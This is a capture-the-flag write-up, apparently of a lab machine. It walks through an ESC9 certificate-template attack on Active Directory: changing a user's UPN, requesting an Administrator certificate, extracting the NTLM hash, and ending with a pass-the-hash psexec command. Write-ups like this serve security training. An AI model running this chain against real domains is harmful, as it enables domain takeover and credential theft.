
The Template "CertificateAuthentication" is vulnerable to an ESC9 Attack, which let's us modify the UPN (User Principal Name) of users.

The idea is to change the ca_operator user's UPN from ca_operator@certified.htb to
Administrator and then request the administrator.pfx and utilize it to retrieve the NTLM Hash of the Administrator User.

ESC9 requires three conditions:

- **StrongCertificateBindingEnforcement** not set to **2** (default: **1**) or **CertificateMappingMethods** contains **UPN** flag
- Certificate contains the **CT_FLAG_NO_SECURITY_EXTENSION** flag in the **msPKI-Enrollment-Flag** value
- Certificate specifies any client authentication EKU

---

1. Changed UPN of ca_operator to Administrator

```
certipy-ad account update -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
```

2. Request a certificate with new UPN (Administrator)

```
certipy-ad req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication
```

Gained administrator.pfx, now we can auth with this .pfx file and retrieve the NTLM Hash of the Administrator User.

3. But before that the ca_operator user's UPN must be changed to the original one.

```
certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
```

4. After, authenticate to the DC with the administrator.pfx certificate.

```
certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.231.186
```

Retrieved NTLM Hash of Administrator User & connected to the target using psexec.

```
impacket-psexec Administrator@DC01.certified.htb -hashes aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```
